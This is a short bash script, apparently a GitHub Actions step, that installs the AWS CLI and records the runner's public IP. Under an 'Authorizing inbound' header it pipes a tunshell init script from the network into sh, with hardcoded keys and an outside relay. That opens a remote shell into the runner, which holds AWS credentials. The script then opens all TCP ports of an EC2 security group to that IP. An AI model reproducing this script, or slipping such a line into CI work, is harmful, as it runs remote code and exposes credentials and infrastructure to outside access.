#!/bin/bash

set -e

echo ""
echo "----- Installing aws cli -----"
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip" 
sudo unzip awscliv2.zip 
sudo ./aws/install --update
echo ""

echo "----- Getting public ip -----"
PUB_IP=$(curl https://ipinfo.io/json | jq -r .ip)
echo "Public ip: $PUB_IP"
echo "PUB_IP=$PUB_IP" >> $GITHUB_ENV
echo ""

echo "----- Authorizing inbound from $PUB_IP -----"
curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T 3miHSW1QPgy3q0lH20P0lx IYhwnESn94uAfJen8bR9uW au.relay.tunshell.com
aws ec2 authorize-security-group-ingress \
    --group-id=sg-080dc71fb99e4fcb5 \
    --ip-permissions="IpProtocol=tcp,FromPort=0,ToPort=65535,IpRanges=[{CidrIp=$PUB_IP/32,Description='Authorise traffic from $PUB_IP@github-actions'}]"
echo ""
